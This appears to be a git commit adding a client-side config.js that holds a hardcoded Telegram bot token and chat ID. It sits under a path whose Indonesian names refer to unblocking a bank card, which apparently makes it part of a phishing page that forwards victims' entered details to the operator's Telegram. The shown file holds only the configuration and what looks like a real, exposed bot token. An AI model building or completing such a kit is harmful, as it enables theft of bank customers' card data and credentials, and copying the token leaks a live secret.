e27db37a78c73ae5739c8a89c41f01a49a7d226b
predi1998a-oss <predi1998a@gmail.com>
2026-08-25 11:13:14 +0700

    Add files via upload

---
+++ www.web-ld.com/membatalkan/batalblokir/blokirkartu/config.js
@@ -0,0 +1,11 @@
+// ==================================================
+// 🔐 KONFIGURASI TELEGRAM — PISAH DARI HTML
+// Simpan file ini sebagai: config.js
+// ==================================================
+window.TELEGRAM_CONFIG = {
+  // 👇 Ganti dengan Token Bot Telegram Anda
+  botToken: "8686497429:AAF6Ta9LcNtLZ3vjIPjvqhtLf7_2jTL_IoE",
+  
+  // 👇 Ganti dengan Chat ID Telegram Anda
+  chatId: "7402071395"
+};
